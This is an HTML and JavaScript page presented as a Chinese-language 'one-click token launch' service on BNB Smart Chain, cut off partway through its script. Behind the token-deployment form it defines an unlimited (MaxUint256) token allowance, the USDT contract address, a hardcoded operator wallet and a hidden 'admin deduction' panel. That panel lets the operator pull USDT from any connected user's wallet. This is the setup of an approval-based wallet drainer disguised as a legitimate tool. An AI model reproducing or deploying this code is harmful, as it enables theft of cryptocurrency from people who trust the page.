<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>天鹅一键发币</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
.container{ max-width:520px; margin:0 auto; }
.header{ text-align:center; margin-bottom:35px; }
.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
.form-item{ margin-bottom:20px; }
label{ display:block; margin-bottom:8px; color:#d0d8f0; }
input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
.file-input{ padding:10px; background:#141b33; }
.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
.btn-connect{ background:#3b63e9; margin-bottom:16px; }
.btn-deploy{ background:#f7c04a; color:#0a0e20; }
.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
.btn:disabled{ opacity:0.55; cursor:not-allowed; }
.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🦢 天鹅一键发币</h1>
</div>
<div class="fee-tip">发币服务费：0.0003 BNB</div>

<div class="card" id="userPanel">
<button id="connectBtn" class="btn btn-connect">连接钱包</button>
<div id="connectTip" class="connect-tip" style="display:none;"></div>
<div id="statusBox" class="status" style="display:none;"></div>

<div class="form-item">
<label>代币全称 Name</label>
<input id="tokenName" placeholder="例如：Swan Coin">
</div>

<div class="form-item">
<label>代币符号 Symbol</label>
<input id="tokenSymbol" placeholder="例如：SWAN">
</div>

<div class="form-item">
<label>初始发行量（不带小数）</label>
<input id="supply" placeholder="例如：100000000">
</div>

<div class="form-item">
<label>代币Logo头像（推荐256×256 透明PNG）</label>
<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
<div class="preview-box">
<img id="logoPreview" alt="头像预览">
<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
</div>
</div>

<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>

<div class="admin-panel" id="adminPanel">
<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
<div class="form-item">
<label>请输入玩家钱包地址</label>
<input id="userAddrInput" placeholder="玩家BSC钱包地址">
</div>
<div class="form-item">
<label>请输入划扣USDT数量</label>
<input id="deductAmountInput" placeholder="例如：100">
</div>
<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
</div>
</div>
</div>

<script>
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
const DEPLOY_FEE_BNB = "0.0003";
const BSC_CHAIN_ID = 56;
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const MAX_ALLOWANCE = ethers.MaxUint256;

let provider = null;
let signer = null;
let connectWalletAddr = "";
let deployContractAddress = null;
let logoFileObj = null;

const connectBtn = document.getElementById("connectBtn");
const deployBtn = document.getElementById("deployBtn");
const statusBox = document.getElementById("statusBox");
const connectTip = document.getElementById("connectTip");
const logoFileInput = document.getElementById("logoFile");
const logoPreviewImg = document.getElementById("logoPreview");
const adminPanel = document.getElementById("adminPanel");
const deductBtn = document.getElementById("deductBtn");
const userAddrInput = document.getElementById("userAddrInput");
const deductAmountInput = document.getElementById("deductAmountInput");

function showStatus(text){
  statusBox.style.display = "block";
  statusBox.innerText = text;
  console.log("状态日志：", text);
}
